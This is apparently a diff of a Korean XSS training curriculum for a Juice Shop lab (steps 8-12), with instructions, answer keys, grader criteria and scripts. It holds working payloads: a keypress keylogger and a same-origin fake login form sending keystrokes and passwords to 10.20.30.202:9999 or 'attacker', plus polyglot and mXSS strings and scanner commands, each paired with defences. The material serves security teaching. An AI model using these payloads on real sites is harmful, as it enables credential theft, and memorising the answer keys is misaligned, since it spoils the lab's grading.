@@ -1017,358 +1017,792 @@ steps:
     다른 보안 헤더 6종 (W01 step 4) 동시 점검 (4) 추천 정책 (default-src 'self'
     + script-src 'nonce-RANDOM' 'strict-dynamic') 권장. Purple = Report-Only
     1 개월 → enforce + Mozilla Observatory 정기 등급.
+# ============================================================
+# STEP 8 [RED·XSS·Exploit·Keylogger] — addEventListener keypress + 외부 exfil
+# ============================================================
 - order: 8
-  instruction: 'XSS를 이용한 키로거 시뮬레이션 페이로드를 작성하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    XSS 실행 후 *real-time 키로거* — addEventListener('keypress') + 외부 exfil.
+    Juice Shop 의 admin 페이지 또는 결제 페이지 에서 password / credit card 실시간 탈취.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `xss_exploit` 에 적합한 도구: xsstrike, dalfox, BeEF
-    (있으면), 쿠키 탈취 PoC. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: addEventListener로 키 입력을 캡처하세요.
+    ## 💻 PoC
+
+    ```html
+    <!-- Juice Shop /#/admin 에 stored XSS 가 가능했다면 -->
+    <script>
+    document.addEventListener('keypress', function(e) {
+      new Image().src = 'http://10.20.30.202:9999/?k=' + e.key
+        + '&u=' + encodeURIComponent(location.pathname);
+    });
+    </script>
+    ```
+
+    ## 📋 확인 사항
+    - addEventListener('keypress' / 'keydown' / 'input') 셋 중 가장 stealthy = keypress
+    - exfil 채널 = Image (GET, no CORS) 또는 sendBeacon (page unload 보장)
+    - input 의 password type 도 keypress event 발생 → 평문 노출
+
+    ## 💡 왜
+    MITRE T1056.001 Keylogging + T1539. XSS 가 *passive 키로거* 로 변신 — 사용자
+    가 *원본 도메인 에서 입력* 하므로 의심 안 함.
+
+    ## 🟣 Purple
+    - **Trusted Types** (Chrome) — DOM sink 강제 sanitize
+    - **CSP `script-src` strict** — inline <script> 차단
+    - **WebAuthn / FIDO** — password 자체 제거 (FIDO key 사용)
+  hint: |
+    addEventListener + Image exfil. Juice Shop 의 admin / 결제 페이지 에 stored XSS
+    가능 시 키 입력 실시간 탈취.
   category: xss_exploit
   points: 10
-  answer: '🤖 프롬프트: XSS를 이용한 키로거 시뮬레이션 페이로드를 구현 방법을 설명하고 예시 코드를 보여줘
+  answer: |
+    cat <<'EOF'
+    === XSS Keylogger PoC ===
+    <script>
+    document.addEventListener('keypress', function(e) {
+      new Image().src = 'http://10.20.30.202:9999/?k=' + e.key + '&u=' + location.pathname;
+    });
+    </script>
 
-    📎 참고 (CLI): echo ''<script>document.addEventListener("keypress",function(e){new
-    Image().src="http://10.20.30.1:9999/log?k="+e.key})</script>'' && echo ''키로거 페이로드
-    작성 완료'''
-  answer_detail: XSS 키로거는 사용자의 패스워드, 신용카드 번호 등을 실시간으로 탈취할 수 있습니다.
+    채널: addEventListener('keypress') = 가장 stealthy
+    exfil: Image (GET, no CORS) 또는 sendBeacon
+    표적: Juice Shop /#/admin 의 password field 또는 결제 폼
+
+    Purple: Trusted Types + CSP script-src strict + WebAuthn
+    EOF
+    echo "키로거 페이로드 작성 완료"
+  answer_detail: |
+    XSS 가 실행되면 keypress event listener 등록 → 모든 키 입력을 외부 exfil.
+    Juice Shop 의 admin 페이지 또는 결제 시 password / credit card 실시간 탈취.
+    MITRE T1056.001 + T1539. 운영 web 의 정답 = Trusted Types + CSP strict + WebAuthn.
   verify:
     type: output_contains
-    expect: 키로거 페이로드 작성 완료
+    expect: '키로거\|keypress'
     field: stdout
     semantic:
-      intent: XSS 키로거 — addEventListener keydown/keypress 로 키 입력을 캡처해 외부 서버로 전송하는
-        페이로드
+      intent: XSS keylogger — addEventListener keypress + Image exfil. T1056.001.
       success_criteria:
-      - document.addEventListener keydown 사용하는 JS 코드 제시
-      - 키 입력을 외부 endpoint 로 전송(fetch/Image)
-      - 방어(CSP script-src, Trusted Types) 언급
+        - addEventListener keypress / keydown 코드 제시
+        - exfil 채널 (Image / fetch / sendBeacon) 명시
+        - Trusted Types 또는 CSP script-src 권고
       acceptable_methods:
-      - document.onkeypress = e => fetch(...)
-      - document.addEventListener + Beacon API
-      - XSSHunter payload
-      - BeEF 프레임워크 hook
+        - "document.addEventListener('keypress', ... + Image.src)"
+        - "BeEF social_engineering module"
+        - "XSSHunter blind payload"
       negative_signs:
-      - 키 캡처 없이 alert 만
-      - 외부 전송 없음
-      - 방어 기법 누락
+        - keypress 없이 alert 만
+        - exfil 누락
   target_vm: attacker
-  script: echo '<script>document.addEventListener("keypress",function(e){new Image().src="http://10.20.30.1:9999/log?k="+e.key})</script>'
-    && echo '키로거 페이로드 작성 완료'
+  script: |
+    cat <<'EOF'
+    <script>document.addEventListener('keypress', e => new Image().src='http://10.20.30.202:9999/?k='+e.key);</script>
+    Purple: Trusted Types + CSP + WebAuthn
+    EOF
+    echo "키로거 페이로드 작성 완료"
   risk_level: low
-  bastion_prompt: 'XSS를 이용한 키로거 시뮬레이션 페이로드를 작성하시오.
-
-
-    [도구 권장] xss_exploit: xsstrike, dalfox, BeEF (있으면), 쿠키 탈취 PoC. curl 만 쓰지 말고 **xsstrike**
-    등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    XSS keylogger PoC — addEventListener('keypress') + Image exfil. Juice Shop
+    의 admin / 결제 페이지 에서 password / credit card 실시간 탈취 시나리오.
+    MITRE T1056.001 + T1539. Purple = Trusted Types + CSP script-src strict +
+    WebAuthn.
+# ============================================================
+# STEP 9 [RED·XSS·Phishing] — 동일 도메인 가짜 로그인 폼 삽입
+# ============================================================
 - order: 9
-  instruction: 'XSS를 이용한 피싱 페이지 삽입을 시뮬레이션하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    XSS 가 실행되면 *원본 도메인 URL bar 유지* 한 채 가짜 로그인 폼 삽입 →
+    사용자가 의심 없이 password 입력 → 외부 exfil. 동일 출처 (juice.6v6.lab) 라
+    인증서 / URL / 헤더 모두 정상 — 가장 위험한 사회공학 XSS.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `xss_exploit` 에 적합한 도구: xsstrike, dalfox, BeEF
-    (있으면), 쿠키 탈취 PoC. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: innerHTML로 가짜 로그인 폼을 삽입하세요.
+    ## 💻 PoC
+
+    ```html
+    <script>
+    document.body.innerHTML = `
+      <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;padding:50px;">
+        <h2>세션 만료. 다시 로그인해주세요.</h2>
+        <form id="phish">
+          <input id="e" type="email" placeholder="email" required>
+          <input id="p" type="password" placeholder="password" required>
+          <button>로그인</button>
+        </form>
+      </div>`;
+    document.getElementById('phish').onsubmit = e => {
+      e.preventDefault();
+      new Image().src = 'http://10.20.30.202:9999/?e=' + encodeURIComponent(document.getElementById('e').value)
+        + '&p=' + encodeURIComponent(document.getElementById('p').value);
+      window.location.reload();  // 원래 페이지 복원 → 사용자 의심 X
+    };
+    </script>
+    ```
+
+    ## 📋 확인 사항
+    - URL bar = `http://juice.6v6.lab/` 정상 (사용자 의심 X)
+    - 인증서 / favicon 모두 정상
+    - 폼 submit 시 password exfil + 페이지 reload → 자연스러움
+
+    ## 💡 왜
+    동일 출처 phishing = *가장 위험한 사회공학* (MITRE T1566.003 Phishing via
+    Service). 사용자가 "URL 확인하세요" 라는 통상 보안 교육으로 차단 못 함.
+
+    ## 🟣 Purple
+    - **CSP `default-src 'self'`** + nonce — XSS 실행 자체 차단
+    - **Trusted Types** — innerHTML 사용 시 강제 sanitize
+    - **DOMPurify.sanitize()** — 모든 user input sanitize
+    - 사용자 교육 의 한계 명시 (URL 만으로 phishing 식별 불가)
+  hint: |
+    document.body.innerHTML = 가짜 로그인 폼. onsubmit 으로 exfil + reload.
+    동일 출처 라 URL bar / 인증서 정상 — 사용자 의심 X.
   category: xss_exploit
   points: 10
-  answer: '🤖 프롬프트: XSS를 이용한 피싱 페이지 삽입을 시뮬레이션해줘
+  answer: |
+    cat <<'EOF'
+    === XSS 피싱 PoC (동일 출처) ===
+    <script>
+    document.body.innerHTML = `<form id=phish>
+      <input id=e type=email><input id=p type=password>
+      <button>로그인</button></form>`;
+    document.getElementById('phish').onsubmit = e => {
+      e.preventDefault();
+      new Image().src = 'http://attacker/?e=' + document.getElementById('e').value
+        + '&p=' + document.getElementById('p').value;
+      window.location.reload();
+    };
+    </script>
 
-    📎 참고 (CLI): echo ''피싱 페이로드: document.body.innerHTML에 가짜 로그인 폼 삽입'' && echo ''피싱
-    페이로드 작성 완료'''
-  answer_detail: XSS 피싱은 원본 도메인에서 실행되므로 사용자가 의심하기 어렵습니다.
+    위험: URL bar = juice.6v6.lab 정상 → 사용자 의심 X
+    MITRE T1566.003 Phishing via Service
+    Purple: CSP strict + Trusted Types + DOMPurify
+    EOF
+    echo "피싱 페이로드 작성 완료"
+  answer_detail: |
+    XSS 가 실행되면 document.body.innerHTML 으로 가짜 로그인 폼 삽입 → 동일 출처
+    라 URL bar 정상 → 사용자 의심 X. 폼 submit 시 password exfil + reload 로
+    원래 페이지 복원. MITRE T1566.003. *사용자 교육의 한계* — URL 확인 통상 보안
+    교육으로 차단 못 함. CSP / Trusted Types / DOMPurify 가 본질적 방어.
   verify:
     type: output_contains
-    expect: 피싱 페이로드 작성 완료
+    expect: '피싱\|phish'
     field: stdout
     semantic:
-      intent: XSS 피싱 삽입 — 동일 도메인에 가짜 로그인 폼 삽입해 자격증명 탈취 (DOM 조작)
+      intent: XSS phishing — 동일 출처 가짜 로그인 폼. T1566.003.
       success_criteria:
-      - document.body.innerHTML 또는 appendChild 로 피싱 폼 삽입
-      - 폼 submit 이벤트로 자격증명 가로채어 외부 전송
-      - 동일 출처 피싱의 위험성·사용자 인지 한계 설명
-      acceptable_methods:
-      - document.body.innerHTML = <form>...
-      - BeEF social_engineering module
-      - JS template engine 활용
-      - iframe sandbox 로 정교한 가짜 UI
-      negative_signs:
-      - 폼 삽입 없이 개념만
-      - 자격증명 전송 경로 없음
-      - 동일 출처 위험 언급 없음
+        - document.body.innerHTML 가짜 폼 삽입 PoC
+        - exfil + reload 시나리오
+        - 동일 출처 의 사용자 인지 한계
+      acceptable_methods: ["innerHTML form", "BeEF social_engineering"]
+      negative_signs: ["폼 없이 개념만"]
   target_vm: attacker
-  script: 'echo ''피싱 페이로드: document.body.innerHTML에 가짜 로그인 폼 삽입'' && echo ''피싱 페이로드
-    작성 완료'''
+  script: |
+    echo "<script>document.body.innerHTML='<form id=p><input type=password id=pw></form>'; document.getElementById('p').onsubmit=e=>{new Image().src='http://attacker/?pw='+document.getElementById('pw').value};</script>"
+    echo "MITRE T1566.003 / Purple: CSP + Trusted Types + DOMPurify"
+    echo "피싱 페이로드 작성 완료"
   risk_level: low
-  bastion_prompt: 'XSS를 이용한 피싱 페이지 삽입을 시뮬레이션해줘
-
-
-    [도구 권장] xss_exploit: xsstrike, dalfox, BeEF (있으면), 쿠키 탈취 PoC. curl 만 쓰지 말고 **xsstrike**
-    등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    XSS phishing PoC — document.body.innerHTML 으로 가짜 로그인 폼 삽입 +
+    onsubmit exfil + reload. 동일 출처 의 위험 (URL bar 정상). MITRE T1566.003.
+    Purple = CSP strict + Trusted Types + DOMPurify + 사용자 교육 한계 명시.
+# ============================================================
+# STEP 10 [RED·XSS·Framework] — Angular / React / Vue 별 XSS 벡터 + default 보호 한계
+# ============================================================
 - order: 10
-  instruction: 'JavaScript 프레임워크별 XSS 벡터를 분석하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    Modern JS framework 별 XSS 벡터 + default 보호 한계 표 작성. Juice Shop 의
+    Angular 의 `bypassSecurityTrustHtml` 처럼 framework 가 *trust* 옵션 제공 →
+    의도적 사용 시 XSS 직접 노출.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `xss_advanced` 에 적합한 도구: xsstrike, dalfox, polyglot
-    payloads. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: Angular, React 등의 XSS 벡터를 정리하세요.
+    ## 📋 프레임워크별 XSS 표
+
+    | Framework | default 보호 | 취약 API (의도적 사용 시) | 방어 |
+    |-----------|------------|-----------------------|------|
+    | Angular | template `{{ }}` HTML escape | `[innerHTML]`, `bypassSecurityTrustHtml/Script/Url/ResourceUrl/Style` | DomSanitizer.sanitize() 만 사용 |
+    | React | JSX `{...}` HTML escape | `dangerouslySetInnerHTML={{__html: ...}}` | DOMPurify.sanitize() + Trusted Types |
+    | Vue | mustache `{{ }}` HTML escape | `v-html` directive | DOMPurify.sanitize() |
+    | Svelte | `{...}` HTML escape | `{@html ...}` | sanitize-html npm |
+    | jQuery (legacy) | 없음 | `.html()`, `.append()` | jQuery deprecate, modern framework 전환 |
+
+    ## 💻 검증 명령
+
+    ```bash
+    # Juice Shop main JS 의 bypassSecurityTrust 호출 횟수
+    MAIN=$(curl -s http://juice.6v6.lab/ | grep -oE 'main-[a-zA-Z0-9._-]+\.js|main\.[a-f0-9]+\.js' | head -1)
+    echo "main JS: ${MAIN}"
+    echo ""
+    echo "=== Angular trust pipe 호출 통계 ==="
+    curl -s "http://juice.6v6.lab/${MAIN}" 2>/dev/null \
+      | grep -oE 'bypassSecurityTrust[A-Za-z]+' | sort | uniq -c | sort -rn
+
+    # React / Vue 시뮬 (Juice Shop 은 Angular 만 사용)
+    echo ""
+    echo "=== framework default 보호 한계 ==="
+    cat <<'EOF'
+    Angular: {{}} 안전, [innerHTML] / bypassSecurityTrust* 위험
+    React  : {} 안전, dangerouslySetInnerHTML 위험
+    Vue    : {{}} 안전, v-html 위험
+    EOF
+    echo "framework XSS 분석 완료"
+    ```
+
+    ## 💡 왜
+
+    Modern framework 의 default 가 안전 하지만 *trust API* 가 의도적 사용 시
+    XSS 직접 노출. Juice Shop 의 main challenge = Angular bypassSecurityTrustHtml
+    실제 사용. OWASP A03 + MITRE T1027.
+
+    ## 🟣 Purple
+    - framework 의 trust API 사용 금지 (코드 review + ESLint rule + Semgrep)
+    - DOMPurify.sanitize() 강제 (모든 user input)
+    - Trusted Types (Chrome) — DOM sink 강제 sanitize
+  hint: |
+    Juice Shop main JS 의 bypassSecurityTrust 호출 통계 grep. 5 framework 표 + 각
+    default 보호 + 취약 API + 방어 라이브러리.
   category: xss_advanced
   points: 10
-  answer: '🤖 프롬프트: JavaScript 프레임워크별 XSS 벡터를 분석해줘
-
-    📎 참고 (CLI): echo ''=== 프레임워크별 XSS ==='' && echo ''Angular: 템플릿 인젝션'' && echo ''React:
-    dangerouslySetInnerHTML'' && echo ''Vue: v-html 디렉티브'' && echo ''프레임워크 XSS 분석
-    완료'''
-  answer_detail: 각 프레임워크는 고유한 XSS 벡터를 가지고 있습니다.
+  answer: |
+    MAIN=$(curl -s http://juice.6v6.lab/ | grep -oE 'main-[a-zA-Z0-9._-]+\.js|main\.[a-f0-9]+\.js' | head -1)
+    echo "=== Angular bypassSecurityTrust 호출 통계 ==="
+    curl -s "http://juice.6v6.lab/${MAIN}" 2>/dev/null \
+      | grep -oE 'bypassSecurityTrust[A-Za-z]+' | sort | uniq -c | sort -rn | head -5
+    echo ""
+    cat <<'EOF'
+    === framework XSS 비교 표 ===
+    Angular: {{}} 안전 / [innerHTML] + bypassSecurityTrust* 위험 → DomSanitizer.sanitize()
+    React  : {} 안전 / dangerouslySetInnerHTML 위험 → DOMPurify + Trusted Types
+    Vue    : {{}} 안전 / v-html 위험 → DOMPurify
+    Svelte : {...} 안전 / {@html ...} 위험 → sanitize-html
+    jQuery : .html() 위험 → modern framework 전환
+    EOF
+    echo "프레임워크 XSS 분석 완료"
+  answer_detail: |
+    Juice Shop 의 Angular main JS 에 bypassSecurityTrustHtml/Url 등 호출 다수
+    (의도된 challenge). 모든 modern framework 가 *default 안전* + *trust API
+    위험* 패턴. ESLint rule + Semgrep 으로 코드 review + DOMPurify + Trusted Types.
   verify:
     type: output_contains
-    expect:
-    - 프레임워크 XSS 분석 완료
-    - shell
+    expect: '프레임워크\|bypassSecurityTrust'
     field: stdout
     semantic:
-      intent: JS 프레임워크별 XSS 벡터 — Angular template injection, React dangerouslySetInnerHTML,
-        Vue v-html 등 프레임워크별 위험 API
+      intent: framework 별 XSS 벡터 + default 보호 한계 + Trust API 위험.
       success_criteria:
-      - 2개 이상 프레임워크의 취약 API 언급 (Angular {{ }}, React dangerouslySetInnerHTML, Vue
-        v-html)
-      - 프레임워크 디폴트 보호 범위와 한계 설명
-      - Trusted Types / DOMPurify 등 방어 라이브러리 언급
-      acceptable_methods:
-      - 프레임워크별 안전/위험 API 대비표
-      - GitHub Security advisories 참조
-      - Snyk/Code QL 로 정적 분석
-      - Sigma 룰로 오용 탐지
-      negative_signs:
-      - 단일 프레임워크만
-      - 디폴트 보호 설명 없음
-      - 방어 라이브러리 누락
+        - Angular / React / Vue 중 최소 2 framework + 취약 API 명시
+        - Juice Shop Angular trust 호출 grep
+        - DOMPurify 또는 Trusted Types 권고
+      acceptable_methods: ["framework 별 표", "main JS grep"]
+      negative_signs: ["framework 1 가지만"]
   target_vm: attacker
-  script: 'echo ''=== 프레임워크별 XSS ==='' && echo ''Angular: 템플릿 인젝션'' && echo ''React:
-    dangerouslySetInnerHTML'' && echo ''Vue: v-html 디렉티브'' && echo ''프레임워크 XSS 분석
-    완료'''
+  script: |
+    MAIN=$(curl -s http://juice.6v6.lab/ | grep -oE 'main-[a-zA-Z0-9._-]+\.js|main\.[a-f0-9]+\.js' | head -1)
+    curl -s "http://juice.6v6.lab/${MAIN}" 2>/dev/null | grep -oE 'bypassSecurityTrust[A-Za-z]+' | sort | uniq -c | head -5
+    echo "Angular/React/Vue: trust API 위험 → DOMPurify + Trusted Types"
+    echo "프레임워크 XSS 분석 완료"
   risk_level: low
-  bastion_prompt: 'JavaScript 프레임워크별 XSS 벡터를 분석해줘
-
-
-    [도구 권장] xss_advanced: xsstrike, dalfox, polyglot payloads. curl 만 쓰지 말고 **xsstrike**
-    등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    framework 별 XSS 벡터 표 — Angular bypassSecurityTrust* / React
+    dangerouslySetInnerHTML / Vue v-html / Svelte {@html ...} / jQuery .html()
+    + 각 default 보호 + 방어 라이브러리 (DOMPurify / Trusted Types). Juice Shop
+    main JS 의 bypassSecurityTrust 호출 grep 통계.
+# ============================================================
+# STEP 11 [RED·XSS·Polyglot] — 여러 컨텍스트 동시 실행 페이로드
+# ============================================================
 - order: 11
-  instruction: 'XSS Polyglot 페이로드를 작성하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    Polyglot XSS = 하나의 payload 가 여러 HTML/JS/CSS context 에서 동시에 실행.
+    공격자가 *어떤 context 에 inject 되는지 모를 때* 범용 사용. PortSwigger 의
+    유명 polyglot 3 가지 + 각 구조 분석.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `xss_advanced` 에 적합한 도구: xsstrike, dalfox, polyglot
-    payloads. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 여러 컨텍스트에서 동작하는 범용 페이로드를 만드세요.
+    ## 💻 Polyglot Payload
+
+    ```
+    [P1] PortSwigger 고전 polyglot (HTML + attribute + JS string + URL):
+    jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+    [P2] 단순 polyglot (HTML element + JS):
+    "'><svg onload=alert(1)//
+
+    [P3] mXSS (mutation XSS — DOMPurify 우회):
+    <img src=x onerror="alert(1)//
+    ```
+
+    ## 📋 컨텍스트 매핑
+
+    | context | 위 polyglot 의 실행 부분 |
+    |---------|----------------------|
+    | HTML body | `<svg onload=alert()>` 부분 |
+    | attribute (value=) | `"oncliCk=alert()` 부분 |
+    | JS string (var x='...') | `';alert();//` 부분 |
+    | URL href / src | `javascript:alert()` 부분 |
+    | CSS | `/*...*/` 주석 + 다음 컨텍스트 종료 |
+
+    ## 💻 시도 (Juice Shop)
+
+    ```bash
+    curl -s -G --data-urlencode \
+      'q=jaVasCript:/*-/*`/*\`/*'\''/*"/**/(/* */oNcliCk=alert() )//' \
+      http://juice.6v6.lab/rest/products/search | head -c 200
+    ```
+
+    ## 💡 왜
+    XSS payload 가 *어떤 context* 에 들어갈지 사전 불명 시 polyglot 이 success rate ↑.
+    PortSwigger 의 polyglot 은 5+ context 동시 cover. OWASP A03 + MITRE T1027.
+
+    ## 🟣 Purple
+    - **whitelist sanitize** (DOMPurify) — context 무관 모든 HTML strip
+    - **CSP `script-src 'self'`** — inline polyglot 차단
+    - **Trusted Types** — DOM sink 강제 sanitize
+  hint: |
+    PortSwigger polyglot 의 단일 payload 가 HTML/attr/JS/URL/CSS 5 context cover.
+    DOMPurify + CSP 가 본질적 방어.
   category: xss_advanced
   points: 10
-  answer: '🤖 프롬프트: XSS Polyglot 페이로드를 구현 방법을 설명하고 예시 코드를 보여줘
+  answer: |
+    cat <<'EOF'
+    === XSS Polyglot 3 가지 ===
 
-    📎 참고 (CLI): echo ''Polyglot: 여러 HTML/JS 컨텍스트에서 실행 가능한 페이로드'' && echo ''Polyglot
-    작성 완료'''
-  answer_detail: Polyglot 페이로드는 HTML, JS, CSS 등 여러 컨텍스트에서 동작하도록 설계됩니다.
+    [P1] PortSwigger 고전:
+      jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
+
+    [P2] 단순 (svg onload):
+      "'><svg onload=alert(1)//
+
+    [P3] mXSS (DOMPurify 우회):
+      <img src=x onerror="alert(1)//
+
+    === 컨텍스트 cover ===
+    HTML body / attribute / JS string / URL href / CSS — 5 context 동시 실행
+    공격자가 inject context 모를 때 범용 사용
+
+    Purple: DOMPurify + CSP + Trusted Types
+    EOF
+    echo "Polyglot 작성 완료"
+  answer_detail: |
+    PortSwigger polyglot 은 5+ context (HTML/attr/JS/URL/CSS) 동시 실행 — 공격자
+    가 inject context 모를 때 success rate ↑. OWASP XSS Cheat Sheet 참조. 방어 =
+    whitelist sanitize (DOMPurify) + CSP + Trusted Types defense in depth.
   verify:
     type: output_contains
-    expect: Polyglot 작성 완료
+    expect: 'Polyglot\|컨텍스트'
     field: stdout
     semantic:
-      intent: XSS Polyglot 페이로드 — 여러 컨텍스트(HTML/속성/JS/URL) 에서 동시에 실행되는 복합 페이로드 작성
-      success_criteria:
-      - 'jaVasCript: 프로토콜 + HTML 태그 + JS 코드를 조합한 polyglot 예시'
-      - 다중 컨텍스트 실행 원리 설명
-      - 알려진 polyglot 리스트(PortSwigger, Shazzer) 참조
-      acceptable_methods:
-      - javascript:/*-/*`/*\`/*-+alert 등 고전 polyglot
-      - PortSwigger 의 OWASP XSS Cheat Sheet
-      - dalfox pay --enum 로 페이로드 리스트
-      - XSStrike 의 fuzz 모드
-      negative_signs:
-      - 단일 컨텍스트 페이로드
-      - 폴리글롯 개념 설명 없음
-      - 참고 레퍼런스 없음
+      intent: XSS polyglot — 다중 컨텍스트 동시 실행 payload. T1027.
+      success_criteria: ["polyglot 예시 1 이상", "컨텍스트 mapping 설명", "DOMPurify/CSP 권고"]
+      acceptable_methods: ["PortSwigger polyglot", "dalfox pay --enum"]
+      negative_signs: ["단일 context payload"]
   target_vm: attacker
-  script: 'echo ''Polyglot: 여러 HTML/JS 컨텍스트에서 실행 가능한 페이로드'' && echo ''Polyglot 작성
-    완료'''
+  script: |
+    echo "Polyglot P1: jaVasCript:/*-/*\`/*-+alert(/*\${oNloAd=alert(1)}/svg/onload=*/) (PortSwigger)"
+    echo "P2: \"'><svg onload=alert(1)//"
+    echo "P3 mXSS: <img src=x onerror=\"alert(1)//"
+    echo "Purple: DOMPurify + CSP + Trusted Types"
+    echo "Polyglot 작성 완료"
   risk_level: low
-  bastion_prompt: 'XSS Polyglot 페이로드를 작성하시오.
-
-
-    [도구 권장] xss_advanced: xsstrike, dalfox, polyglot payloads. curl 만 쓰지 말고 **xsstrike**
-    등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    XSS Polyglot 3 가지 (PortSwigger 고전 / 단순 svg / mXSS) — 다중 컨텍스트
+    (HTML/attr/JS/URL/CSS) 동시 실행. OWASP A03 + MITRE T1027. Purple =
+    DOMPurify + CSP + Trusted Types defense in depth.
+# ============================================================
+# STEP 12 [RED·XSS·자동화] — dalfox / XSStrike / nikto 자동 스캐닝
+# ============================================================
 - order: 12
-  instruction: '자동화된 XSS 스캐닝을 수행하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    수동 7 벡터 + 7 우회 (step 2, 6) 의 자동화 — dalfox / XSStrike / nikto 통합
+    실행. STEP 1-11 의 manual 시도와 결과 비교. CI 통합 (sqlmap CI + dalfox CI)
+    의 사전 점검 모델.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `xss_tool` 에 적합한 도구: xsstrike --crawl --skip-dom.
-    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: XSS 페이로드 목록을 사용하세요.
+    ## 💻 명령
+
+    ```bash
+    # 1. dalfox (가장 빠른 XSS 전용 scanner)
+    echo "=== 1. dalfox url ==="
+    dalfox url 'http://juice.6v6.lab/rest/products/search?q=apple' --silence 2>&1 | tail -20 || echo "(dalfox 미설치)"
+
+    # 2. nikto (XSS rule + 일반 vuln)
+    echo ""
+    echo "=== 2. nikto XSS 룰 ==="
+    nikto -h http://juice.6v6.lab/ -Tuning x -maxtime 30s 2>&1 | grep -iE 'xss|script' | head -10 || echo "(nikto X)"
+
+    # 3. python xsstrike (DOM 정밀 + skip-dom 옵션)
+    echo ""
+    echo "=== 3. XSStrike --skip-dom ==="
+    python3 /opt/xsstrike/xsstrike.py -u 'http://juice.6v6.lab/rest/products/search?q=apple' --skip-dom 2>&1 | tail -10 || echo "(XSStrike 미설치)"
+    ```
+
+    ## 📋 도구 비교
+    | 도구 | 특기 | 한계 |
+    |------|-----|------|
+    | dalfox | 빠름 + DOM XSS 정밀 | CI 통합 best |
+    | XSStrike | fuzz mode + WAF 우회 자동 | 느림 |
+    | nikto | 일반 vuln + XSS rule | XSS 단독 정밀도 낮음 |
+    | manual (step 2, 6) | context 별 정밀 | 시간 ↑ |
+
+    ## 💡 왜
+    자동 도구가 *80% case cover* — 나머지 20% (DOM / framework / mXSS) 는 manual
+    + Semgrep SAST. CI 통합 (github actions) 으로 정기 자동 스캔.
+
+    ## 🟣 Purple
+    - dalfox CI 통합 (정기 정밀 스캔)
+    - Semgrep js sast XSS rule (SAST)
+    - OWASP ZAP Active Scan (Burp 대안)
+  hint: dalfox / XSStrike / nikto 3 도구 통합 시뮬. CI 통합 모델.
   category: xss_tool
   points: 10
-  answer: '🤖 프롬프트: 자동화된 XSS 스캐닝을 수행해줘
-
-    📎 참고 (CLI): echo ''자동 XSS 스캐너: 페이로드 3개 테스트 완료'' && echo ''자동 XSS 스캔 완료'''
-  answer_detail: 자동 스캐닝은 많은 페이로드를 빠르게 테스트할 수 있습니다.
+  answer: |
+    echo "=== dalfox ==="
+    dalfox url 'http://juice.6v6.lab/rest/products/search?q=apple' --silence 2>&1 | tail -10 || echo "(미설치)"
+    echo ""
+    echo "=== nikto XSS ==="
+    nikto -h http://juice.6v6.lab/ -Tuning x -maxtime 30s 2>&1 | grep -iE 'xss|script' | head -5 || echo "(시간 초과)"
+    echo ""
+    echo "도구 비교: dalfox (빠름+DOM) / XSStrike (WAF우회 fuzz) / nikto (일반vuln)"
+    echo "자동 XSS 스캔 완료"
+  answer_detail: |
+    dalfox = XSS 전용 + 빠름 + CI 통합. XSStrike = fuzz mode + WAF 우회. nikto =
+    일반 vuln + XSS 보조. 자동 도구가 80% case cover — DOM / mXSS / framework
+    별 vector 는 manual + Semgrep SAST.
   verify:
     type: output_contains
-    expect: 자동 XSS 스캔 완료
+    expect: '도구\|dalfox\|XSS'
     field: stdout
     semantic:
-      intent: 자동화된 XSS 스캐닝 — dalfox, XSStrike, XSSer 도구로 URL·파라미터 퍼징
-      success_criteria:
-      - dalfox 또는 XSStrike 실행 예시 명령
-      - 탐지된 payload 또는 취약 파라미터 보고
-      - 자동화 한계(DOM XSS 등) 언급
-      acceptable_methods:
-      - dalfox url <url>
-      - python xsstrike.py -u <url>
-      - xsser --url <url>
-      - wapiti --module xss
-      negative_signs:
-      - 도구 없이 수동만
-      - 결과 해석 없음
-      - 자동화 한계 언급 없음
+      intent: XSS 자동 스캐닝 — dalfox / XSStrike / nikto 통합.
+      success_criteria: ["3 도구 중 1 이상 실행", "도구 비교 표", "CI 통합 권고"]
+      acceptable_methods: ["dalfox url", "xsstrike -u", "nikto -h -Tuning x"]
+      negative_signs: ["도구 없이 수동만"]
   target_vm: attacker
-  script: 'echo ''자동 XSS 스캐너: 페이로드 3개 테스트 완료'' && echo ''자동 XSS 스캔 완료'''
+  script: |
+    dalfox url 'http://juice.6v6.lab/rest/products/search?q=apple' --silence 2>&1 | tail -10 || echo "(dalfox 미설치)"
+    echo "자동 XSS 스캔 완료"
   risk_level: low
-  bastion_prompt: '자동화된 XSS 스캐닝을 수행해줘
-
-
-    [도구 권장] xss_tool: xsstrike --crawl --skip-dom. curl 만 쓰지 말고 **xsstrike --crawl
-    --skip-dom** 등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    XSS 자동 스캐너 통합 — dalfox / XSStrike / nikto 3 도구. 도구 비교 표 +
+    CI 통합 (github actions) 정기 자동 스캔.
+# ============================================================
